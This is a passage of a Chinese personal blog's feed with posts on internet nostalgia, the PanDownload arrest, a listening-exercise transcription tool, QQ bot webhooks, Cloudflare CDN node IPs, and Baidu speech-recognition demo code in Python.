href="https://www.cnblogs.com/licsber/p/cxmooc-tools.html">https://www.cnblogs.com/licsber/p/cxmooc-tools.html</a><br>互联网怎么了<br>起初没有人在意这场灾难，直到这灾难和每个人息息相关。</p><p>自pd作者被抓以来，各路服务纷纷跑路，真的想问一下，互联网到底怎么了？</p><p>我理解的互联网精神是自由，倡导一种“人人为我，我为人人”的信念。</p><p>有幸在我五岁那年第一次接触到了互联网，那时候流行MSN，当时注册之后都没人跟我聊天，然后接触到了qq，第一个qq网名还叫快乐小子，当时各种盗版qq横行，跟别人聊天可以看到对方ip或者透视隐身状态是那个时代的“炫酷操作”。</p><p>之后就是各种网页小游戏盛行，比如校内网“荣光医院”、种菜，QQ空间的农牧场、停车，之后就是经历了当年的3Q大战，打的是真狠。还有2345的流行，2345加速浏览器带来了真正的VOIP免费电话。</p><p>接下来是网盘满天飞的时代，经历了微盘倒闭、115逐渐爆炸，不过难以置信的是，那个年代分享外·挂用的ys168之类的网盘，到现在还可以正常使用，我刚刚在上面下到了我2012年上传的桌面雪花程序、造梦西游修改器和红警2部队修改器，吃惊。</p><p>然后接触到了VBS、再之后是VB、易语言，用着群里的教程写了第一个自己的dnf外·挂，因为全局冰冻打到树精图的时候树精疯狂加血，应该是加的太多了触发了封号机制，记得当时是5年还是20年，干脆弃坑，于是乎接下来除了mc和lol就没接触过其他网游，时间都留给了编程。</p><p>最后在52pojie上遇到更多大佬，接触rfid安全，在淘宝、闲鱼售卖了一段时间的相关硬件，免费提供自己编写的教程等等，接触看雪还有一些其他论坛，经历了乌云的倒闭，世纪佳缘事件。</p><p>下面记录一下跑路事件的经过吧，互联网的记忆是有限的，留在博客里，日后还能怀念一下。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/737845/1587287411822-050aee36-a18a-4cc9-bd12-2814bc83a29d.jpeg" srcset="/img/loading.gif" lazyload alt="1"></p>]]></content>
    
    
    
    <tags>
      
      <tag>daily</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>百度云盘不限速下载神器 PanDownload 作者被抓获</title>
    <link href="/2020/04/38.html"/>
    <url>/2020/04/38.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>唉，这么好的技术为啥非要走上违法犯罪的道路上呢？金钱的诱惑就那么大吗？可惜了PanDownload这个神器了，以后又得享用百度云盘龟速下载了！唉！何必呢？</p></blockquote><p>据蓝点网消息：百度云盘不限速下载神器 PanDownload 作者被警察抓获，经查: 2017 年，犯罪嫌疑人在家中编写可以通过百度网盘官方服务器的客户端身份认证，实现以非会员权限突破百度网盘官方设定，高速下载“Pandownload”软件，并在互联网.上发布。期间犯罪嫌疑人租用网络服务器进行更新维护并发布接受捐赠的收款码，同时建立 QQ 群”，向进群人员收取 1 至 10 元不等的进群费，群内提供更稳定的“Pandownload”内测版本。截至案发,犯罪嫌疑人非法获利 30 万余元。</p><p><img src="https://ae01.alicdn.com/kf/He9182f4892c04321b30d05045f7ea9e6Z.jpg" srcset="/img/loading.gif" lazyload alt="1"></p><p>目前实测 PanDownload 客户端已经无法打开和运行了</p><p>唉，这么好的技术为啥非要走上违法犯罪的道路上呢？金钱的诱惑就那么大吗？可惜了 PanDownload 这个神器了，以后又得享用百度云盘龟速下载了！唉！何必呢？</p>]]></content>
    
    
    
    <tags>
      
      <tag>daily</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>U校园听力识别（Ulistenhelper)使用文档及相关问题</title>
    <link href="/2020/04/37.html"/>
    <url>/2020/04/37.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>本程序完全使用Python开发，仅供学习和交流使用，切勿用于其他非法用途。否则后果自负。本人不负任何责任。</p></blockquote><p><strong>请查看新的文档 -&gt; <a href="https://gocos.cn/2020/07/51.html">Ulistenhelper - 基于腾讯云语音识别的U校园听力识别工具</a></strong></p><h1 id="开发由来"><a href="#开发由来" class="headerlink" title="开发由来"></a>开发由来</h1><p>本人刚开始学习python，是一名听力十级障碍患者，所以为了平时不挂科，检验自己自学的成果，写了这个小工具，第二点就是，我看U这个平台很不爽，非常喜欢套娃啊，之前写脚本就觉得很恶心。不过也感觉很。。。，嗯~总之就是写了这个程序了。用来拯救我，还有服务爱学(tou)习(lan)的大学生。</p><h1 id="程序用到的python库"><a href="#程序用到的python库" class="headerlink" title="程序用到的python库"></a>程序用到的python库</h1><p>1.腾讯云python SDK<br>2.resquests<br>3.json<br>4.time<br>5.pyinstaller</p><h1 id="程序界面"><a href="#程序界面" class="headerlink" title="程序界面"></a>程序界面</h1><p>由于刚学吗，UI啥的还没接触。界面丑陋。<br><img src="https://ae01.alicdn.com/kf/Hd7fd71395e46465ab2388338228042b5x.png" srcset="/img/loading.gif" lazyload alt="1"></p><h1 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h1><p>1.获取QQ群机器人的webhook地址——<a href="https://gocos.cn/2020/04/36.html">获取教程</a> 已经没用了<br>2.抓取听力音频——<a href="https://gocos.cn/2020/04/34.html">获取教程</a><br>3.QQ群查看识别内容</p><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>腾讯云提供的API服务<br>腾讯Hoo!k机器人服务</p><h1 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h1><p>测试中，暂无问题，后期会更新</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hoo!k机器人进群与获取webhook教程</title>
    <link href="/2020/04/36.html"/>
    <url>/2020/04/36.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>   webhooks是一个api概念，是微服务api的使用范式之一，也被成为反向api，即：前端不主动发送请求，完全由后端推送。 举个常用例子，比如你的好友发了一条朋友圈，后端将这条消息推送给所有其他好友的客户端，就是 Webhooks 的典型场景。<br>　　简单来说，WebHook就是一个接收HTTP POST（或GET，PUT，DELETE）的URL。一个实现了WebHook的API提供商就是在当事件发生的时候会向这个配置好的URL发送一条信息。与请求-响应式不同，使用WebHooks，你可以实时接受到变化。</p></blockquote><p>那么，我么如何将Hoo!k机器人添加到群里，并获取webhook呢？</p><p>1.请将下面QQ号<code>2854196399</code>先发到你管理或者你创建的群<br>2.点击qq号，将机器人添加到你的群，然后打开消息推送，并且选择推送消息那里的已设置。<br><img src="https://ae01.alicdn.com/kf/H93ef214d90da43df97cbcaa32621d015t.jpg" srcset="/img/loading.gif" lazyload alt="1"><br><img src="https://ae01.alicdn.com/kf/Hdc67330127b94deb9633a61b07a08d42x.jpg" srcset="/img/loading.gif" lazyload alt="2"><br><img src="https://ae01.alicdn.com/kf/H96927892e6a84ac290ec36dd934797efj.jpg" srcset="/img/loading.gif" lazyload alt="3"><br>3.接下来选择生成接口复制 key= 后面的参数记录保存，千万不可泄露接下来选择生成接口复制 key= 后面的参数记录保存，千万不可泄露<br>4.获取完成</p>]]></content>
    
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用Cloudflare CDN 如何自定义节点（CF自选IP）</title>
    <link href="/2020/04/35.html"/>
    <url>/2020/04/35.html</url>
    
    <content type="html"><![CDATA[<p>具体步骤就不说了,大概就是用Cloudflare的CDN以CNAME别名方式解析,然后到各种智能dns里面a到节点就ok了(利用A记录进行负载均衡)</p><p>接入CF之后，CF会给域名分配一个入口IP，一般是美西洛杉矶那边的。这个IP其实是采用的AnyCast技术，当用户访问到时候，会就近分配一个真实的节点IP，以加快访问速度。</p><p>访问：http://{节点IP/域名}/cdn-cgi/trace。比如要查看访客的真实IP ，则访问 HTTPS://<a href="http://www.ily.plus/cdn-cgi/trace">www.ily.plus/cdn-cgi/trace</a></p><p> </p><p>需要用到的东西：<br>CF:<code>www.cloudflare.com</code></p><p>cfp（Cloudflare合作伙伴）<br>推荐笨牛:<code>http://cdn.bnxb.com</code> </p><p>稳定很长时间的: <code>https://cf.tlo.xyz/</code></p><p>萌精灵 <code>https://cdn.moeelf.com/</code></p><p>智能解析 国内随便选 建议dnspod/dnsdun/dnsla</p><p>都比较不错 因为这三家支持智能三网/四网解析 外加搜索引擎百度等单独解析</p><h2 id="下面说一下IP段-这里面有一个思想就是需要自己添加后不断去优化-也就是用各种ping命令检查一下-把延迟比较高的换掉"><a href="#下面说一下IP段-这里面有一个思想就是需要自己添加后不断去优化-也就是用各种ping命令检查一下-把延迟比较高的换掉" class="headerlink" title="下面说一下IP段,这里面有一个思想就是需要自己添加后不断去优化! 也就是用各种ping命令检查一下,把延迟比较高的换掉"></a>下面说一下IP段,这里面有一个思想就是需要自己添加后不断去优化! 也就是用各种ping命令检查一下,把延迟比较高的换掉</h2><p>CloudFlare的节点：国内速较快的IP段：</p><p>（联通移动推荐节点）</p><p><code>104.23.240.0-104.23.243.254</code></p><p>（电信推荐CloudFlare 百度云合作 ip）</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">162.159.208.4</span>-<span class="hljs-number">162</span>.<span class="hljs-number">159</span>.<span class="hljs-number">208</span>.<span class="hljs-number">103</span><br><br><span class="hljs-number">162.159.209.4</span>-<span class="hljs-number">162</span>.<span class="hljs-number">159</span>.<span class="hljs-number">209</span>.<span class="hljs-number">103</span><br><br><span class="hljs-number">162.159.210.4</span>-<span class="hljs-number">162</span>.<span class="hljs-number">159</span>.<span class="hljs-number">210</span>.<span class="hljs-number">103</span><br><br><span class="hljs-number">162.159.211.4</span>-<span class="hljs-number">162</span>.<span class="hljs-number">159</span>.<span class="hljs-number">211</span>.<span class="hljs-number">103</span><br></code></pre></td></tr></table></figure><p>各线路推荐列表：<br>电信：推荐走圣何塞，例：<code>104.16.160.*</code> 或者上面的百度云合作 ip。<br>移动：推荐走移动香港，例：<code>172.64.32.*、141.101.115.*</code> 或者 <code>104.23.240.0-104.23.243.254</code>。<br>联通：没发布什么好线路，可走圣何塞。例：<code>104.16.160.*</code> 或者 <code>104.23.240.0-104.23.243.254</code>。也可以试一下走亚特兰大 <code>108.162.236.*</code>（日前不可用。） 。</p><p>延迟和速度不错，IP地址：<code>162.159.211.3-162.159.211.103</code></p><p>移动很不错：<code>198.41.214.162</code></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">162.158.26.1</span><br><span class="hljs-number">172.68.144.1</span><br><span class="hljs-number">172.69.152.1</span><br><span class="hljs-number">104.19.195.151</span><br><span class="hljs-number">104.18.177.69</span><br><span class="hljs-number">104.25.176.1</span><br></code></pre></td></tr></table></figure><p>可以设置用于 移动网络</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">108.162.227.1</span><br><span class="hljs-number">162.158.4.1</span><br><span class="hljs-number">172.69.152.1</span><br></code></pre></td></tr></table></figure><p>可以设置用于 联通网络</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">162.158.116.1</span><br><span class="hljs-number">108.162.226.1</span><br></code></pre></td></tr></table></figure><p>可以设置用于 默认网络</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.68.32.1</span><br><span class="hljs-number">108.162.243.1</span><br><span class="hljs-number">108.162.245.1</span><br><span class="hljs-number">108.162.246.1</span><br><span class="hljs-number">172.68.172.1</span><br></code></pre></td></tr></table></figure><p>可以设置用于 电信网络</p><p>官方列表：CloudFlare公开的节点</p><p>某博主找到了一批CF亚洲节点，再通过实测最终得出了3个ping值很低（100ms以内）的节点IP：</p><p><code>202.86.161.100</code>（澳门）、<code>27.102.67.84</code>（韩国）、<code>23.61.246.100</code>（台湾，速度略慢，但相对其他节点亚洲又好那么一丢丢）。未测试</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>U校园获取听力音频教程</title>
    <link href="/2020/04/34.html"/>
    <url>/2020/04/34.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>今天下午成功的把识别程序写完了，不过这次并没有使用百度提供的服务，对，但现在为止，我还没有解决pcm的问题，在这里还是想请大佬指点一下，毕竟是新手，我还是有自知之明的。那么问题又来了，我这次用的是什么呢，嘿嘿，这次我选择了腾讯云的语音识别，它可以直接识别MP3格式的音频，当然，更加吸引人的是，它可以跨域识别。这就大大提高了效率。万事俱备，只欠东风。接下来我就来说一说如何获取听力音频。</p></blockquote><a id="more"></a><h1 id="利用浏览器工具获取"><a href="#利用浏览器工具获取" class="headerlink" title="利用浏览器工具获取"></a>利用浏览器工具获取</h1><p>1.登陆U校园<br>2.进入听力<br>3.鼠标点击<code>右键</code>,选择检查，会出现面情况<br><img src="https://ae01.alicdn.com/kf/Hf33b7717b86046a2b05f081505070009I.png" srcset="/img/loading.gif" lazyload alt="1"><br>4.我们按照下图中的操作来做<br><img src="https://ae01.alicdn.com/kf/H99a081b23139472f8c1a9316223f00e5h.png" srcset="/img/loading.gif" lazyload alt="2"><br><img src="https://ae01.alicdn.com/kf/H54f6cd9618ca4471818e1fa52d787c4fW.png" srcset="/img/loading.gif" lazyload alt="3"><br>5.我们把链接复制下来就可以了，例如这题的听力音频就为：<br><code>https://ucampus.cdn.unipus.cn/uexercise/quesres/hearmp3/b_320/t_102/201511/wrbchf_17094343468.mp3</code><br>6.获取结束</p><h1 id="利用抓包工具获取"><a href="#利用抓包工具获取" class="headerlink" title="利用抓包工具获取"></a>利用抓包工具获取</h1><p>什么是抓包工具我就不说了，不懂得自行百度，这里我们用Fiddler进行演示</p><p>1.登陆U校园<br>2.进入听力<br>3.打开抓包工具<br><img src="https://ae01.alicdn.com/kf/H2da6ce63939349cab1ff0a6721c4a9d7S.png" srcset="/img/loading.gif" lazyload alt="4"><br>4.点击播放听力的按钮<br>5.看抓包工具找音频连接<br><img src="https://ae01.alicdn.com/kf/Head32162446a4d3780bd4b7da1d2941eQ.png" srcset="/img/loading.gif" lazyload alt="5"><br>6.复制链接，结束</p><p>好，今天就说这两种方法。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python语音识别折腾记</title>
    <link href="/2020/04/33.html"/>
    <url>/2020/04/33.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>今天好不容易休息半天，但是又被英语作业给折服了，就上一次<a href="https://gocos.cn/2020/03/29.html">U校园半自动化</a>造福大学生之后，就有这么一个想法，是什么呢？<br>就是能不能把听力的内容识别出来，变成文本。这样就可以看听力文本了，那答题岂不是很简单？<br>ok，废话不多说，下面就来介绍下自己的折腾日记和遇到的问题</p></blockquote><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><p>我们第一步要做的就是拿到听力文件，怎么拿呢？——抓包<br>由于过于简单，我只说大概步骤，具体百度<br><code>登陆——进入听力测验——按F12打开开发者工具——点击音频播放按钮——看工具里的最后一个资源——双击该资源进入——下载音频</code></p><h1 id="音频格式转换"><a href="#音频格式转换" class="headerlink" title="音频格式转换"></a>音频格式转换</h1><p>我们拿到的音频格式是MP3格式的，按照<a href="https://ai.baidu.com/ai-doc/SPEECH/Vk38lxily">百度语音识别的文档</a>来说支持音频格式：pcm、wav、amr、m4a的音频，<br>当然我在这里卡住了，用格式工厂转码后进行识别会报错，由于格式工厂没有pcm格式，所以我在这里纠结怎么转换，当然百度也给出了<a href="https://ai.baidu.com/ai-doc/SPEECH/7k38lxpwf">转换方法</a><br>我这里还没研究明白，恳请大佬指点，下面我们只能用百度提供的示例音频做演示了QAQ</p><h1 id="在百度智能云开通服务"><a href="#在百度智能云开通服务" class="headerlink" title="在百度智能云开通服务"></a>在百度智能云开通服务</h1><p>1.登陆<a href="https://login.bce.baidu.com/?account=&redirect=http://console.bce.baidu.com/">百度智能云</a><br>2.<img src="https://s1.ax1x.com/2020/04/09/G5RH6H.png" srcset="/img/loading.gif" lazyload alt="2"><br>3.<img src="https://ae01.alicdn.com/kf/H2c23f18f5055486ab6756f3fb584498ei.png" srcset="/img/loading.gif" lazyload alt="3"><br>4.<img src="https://ae01.alicdn.com/kf/Hba63e7bd6da14287a237bf5504f519eb2.png" srcset="/img/loading.gif" lazyload alt="4"><br>5.<img src="https://ae01.alicdn.com/kf/H9b980f96caea4f60913b8cef7d2c4742i.png" srcset="/img/loading.gif" lazyload alt="5"><br>6.<img src="https://ae01.alicdn.com/kf/H43e62f8f01f94c3e97bf74740a61cd08o.png" srcset="/img/loading.gif" lazyload alt="6"><br>7.创建成功后，我们就会获得api-key,secret-key（后面会用到）<br><img src="https://ae01.alicdn.com/kf/H7bd399a826824546bbddf77b6ac324d6a.png" srcset="/img/loading.gif" lazyload alt="7"></p><h1 id="开始在python构造请求"><a href="#开始在python构造请求" class="headerlink" title="开始在python构造请求"></a>开始在python构造请求</h1><p>这里我们直接使用百度提供的<a href="https://github.com/Baidu-AIP/speech-demo/tree/master/rest-api-asr/python">DEMO</a>,然后自己做一些修改</p><ul><li><p>安装依赖库(利用pip,不懂请自行百度)</p></li><li><p><code>pip install baidu-aip</code> # 百度语音识别Python SDK</p></li><li><p><code>pip install urllib</code> # 网页请求库</p></li><li><p>开始构造代码（注意看注释）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-comment"># 引入所需库</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><br>IS_PY3 = sys.version_info.major == <span class="hljs-number">3</span><br><br><span class="hljs-keyword">if</span> IS_PY3:<br>    <span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br>    <span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> Request<br>    <span class="hljs-keyword">from</span> urllib.error <span class="hljs-keyword">import</span> URLError<br>    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode<br>    timer = time.perf_counter<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">from</span> urllib2 <span class="hljs-keyword">import</span> urlopen<br>    <span class="hljs-keyword">from</span> urllib2 <span class="hljs-keyword">import</span> Request<br>    <span class="hljs-keyword">from</span> urllib2 <span class="hljs-keyword">import</span> URLError<br>    <span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> urlencode<br>    <span class="hljs-keyword">if</span> sys.platform == <span class="hljs-string">&quot;win32&quot;</span>:<br>        timer = time.clock<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># On most other platforms the best timer is time.time()</span><br>        timer = time.time<br><br><span class="hljs-comment"># 设置api-key,secret-key  此数据在上文有提及</span><br>API_KEY = <span class="hljs-string">&#x27;你的api-key&#x27;</span><br>SECRET_KEY = <span class="hljs-string">&#x27;你的secret-key&#x27;</span><br><br><span class="hljs-comment"># 需要识别的文件  ./audio/16k.pcm为音频文件路径，例如在D盘，那就是D:/audio/16k.pcm</span><br>AUDIO_FILE = <span class="hljs-string">&#x27;./audio/16k.pcm&#x27;</span>  <span class="hljs-comment"># 只支持 pcm/wav/amr 格式，极速版额外支持m4a 格式</span><br><span class="hljs-comment"># 文件格式</span><br>FORMAT = AUDIO_FILE[-<span class="hljs-number">3</span>:]  <span class="hljs-comment"># 文件后缀只支持 pcm/wav/amr 格式，极速版额外支持m4a 格式</span><br><br><span class="hljs-comment"># 电脑mac地址，个人感觉没用，默认即可</span><br>CUID = <span class="hljs-string">&#x27;123456PYTHON&#x27;</span><br><span class="hljs-comment"># 采样率</span><br>RATE = <span class="hljs-number">16000</span>  <span class="hljs-comment"># 固定值</span><br><br><span class="hljs-comment"># 普通版</span><br><br>DEV_PID = <span class="hljs-number">1537</span>  <span class="hljs-comment"># 1537 表示识别普通话，使用输入法模型。根据文档填写PID，选择语言及识别模型</span><br>ASR_URL = <span class="hljs-string">&#x27;http://vop.baidu.com/server_api&#x27;</span><br>SCOPE = <span class="hljs-string">&#x27;audio_voice_assistant_get&#x27;</span>  <span class="hljs-comment"># 有此scope表示有asr能力，没有请在网页里勾选，非常旧的应用可能没有</span><br><br><span class="hljs-comment">#测试自训练平台需要打开以下信息， 自训练平台模型上线后，您会看见 第二步：“”获取专属模型参数pid:8001，modelid:1234”，按照这个信息获取 dev_pid=8001，lm_id=1234</span><br><span class="hljs-comment"># DEV_PID = 8001 ;   </span><br><span class="hljs-comment"># LM_ID = 1234 ;</span><br><br><span class="hljs-comment"># 极速版 打开注释的话请填写自己申请的appkey appSecret ，并在网页中开通极速版（开通后可能会收费）</span><br><br><span class="hljs-comment"># DEV_PID = 80001</span><br><span class="hljs-comment"># ASR_URL = &#x27;http://vop.baidu.com/pro_api&#x27;</span><br><span class="hljs-comment"># SCOPE = &#x27;brain_enhanced_asr&#x27;  # 有此scope表示有极速版能力，没有请在网页里开通极速版</span><br><br><span class="hljs-comment"># 忽略scope检查，非常旧的应用可能没有</span><br><span class="hljs-comment"># SCOPE = False</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoError</span>(<span class="hljs-params">Exception</span>):</span><br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-string">&quot;&quot;&quot;  TOKEN start &quot;&quot;&quot;</span><br><br>TOKEN_URL = <span class="hljs-string">&#x27;http://openapi.baidu.com/oauth/2.0/token&#x27;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fetch_token</span>():</span><br>    params = &#123;<span class="hljs-string">&#x27;grant_type&#x27;</span>: <span class="hljs-string">&#x27;client_credentials&#x27;</span>,<br>              <span class="hljs-string">&#x27;client_id&#x27;</span>: API_KEY,<br>              <span class="hljs-string">&#x27;client_secret&#x27;</span>: SECRET_KEY&#125;<br>    post_data = urlencode(params)<br>    <span class="hljs-keyword">if</span> (IS_PY3):<br>        post_data = post_data.encode( <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    req = Request(TOKEN_URL, post_data)<br>    <span class="hljs-keyword">try</span>:<br>        f = urlopen(req)<br>        result_str = f.read()<br>    <span class="hljs-keyword">except</span> URLError <span class="hljs-keyword">as</span> err:<br>        print(<span class="hljs-string">&#x27;token http response http code : &#x27;</span> + <span class="hljs-built_in">str</span>(err.code))<br>        result_str = err.read()<br>    <span class="hljs-keyword">if</span> (IS_PY3):<br>        result_str =  result_str.decode()<br><br>    print(result_str)<br>    result = json.loads(result_str)<br>    print(result)<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;access_token&#x27;</span> <span class="hljs-keyword">in</span> result.keys() <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;scope&#x27;</span> <span class="hljs-keyword">in</span> result.keys()):<br>        print(SCOPE)<br>        <span class="hljs-keyword">if</span> SCOPE <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> SCOPE <span class="hljs-keyword">in</span> result[<span class="hljs-string">&#x27;scope&#x27;</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)):  <span class="hljs-comment"># SCOPE = False 忽略检查</span><br>            <span class="hljs-keyword">raise</span> DemoError(<span class="hljs-string">&#x27;scope is not correct&#x27;</span>)<br>        print(<span class="hljs-string">&#x27;SUCCESS WITH TOKEN: %s  EXPIRES IN SECONDS: %s&#x27;</span> % (result[<span class="hljs-string">&#x27;access_token&#x27;</span>], result[<span class="hljs-string">&#x27;expires_in&#x27;</span>]))<br>        <span class="hljs-keyword">return</span> result[<span class="hljs-string">&#x27;access_token&#x27;</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> DemoError(<span class="hljs-string">&#x27;MAYBE API_KEY or SECRET_KEY not correct: access_token or scope not found in token response&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;  TOKEN end &quot;&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    token = fetch_token()<br><br>    speech_data = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(AUDIO_FILE, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> speech_file:<br>        speech_data = speech_file.read()<br><br>    length = <span class="hljs-built_in">len</span>(speech_data)<br>    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> DemoError(<span class="hljs-string">&#x27;file %s length read 0 bytes&#x27;</span> % AUDIO_FILE)<br>    speech = base64.b64encode(speech_data)<br>    <span class="hljs-keyword">if</span> (IS_PY3):<br>        speech = <span class="hljs-built_in">str</span>(speech, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    params = &#123;<span class="hljs-string">&#x27;dev_pid&#x27;</span>: DEV_PID,<br>             <span class="hljs-comment">#&quot;lm_id&quot; : LM_ID,    #测试自训练平台开启此项</span><br>              <span class="hljs-string">&#x27;format&#x27;</span>: FORMAT,<br>              <span class="hljs-string">&#x27;rate&#x27;</span>: RATE,<br>              <span class="hljs-string">&#x27;token&#x27;</span>: token,<br>              <span class="hljs-string">&#x27;cuid&#x27;</span>: CUID,<br>              <span class="hljs-string">&#x27;channel&#x27;</span>: <span class="hljs-number">1</span>,<br>              <span class="hljs-string">&#x27;speech&#x27;</span>: speech,<br>              <span class="hljs-string">&#x27;len&#x27;</span>: length<br>              &#125;<br>    post_data = json.dumps(params, sort_keys=<span class="hljs-literal">False</span>)<br>    <span class="hljs-comment"># print post_data</span><br>    req = Request(ASR_URL, post_data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    req.add_header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        begin = timer()<br>        f = urlopen(req)<br>        result_str = f.read()<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Request time cost %f&quot;</span> % (timer() - begin))<br>    <span 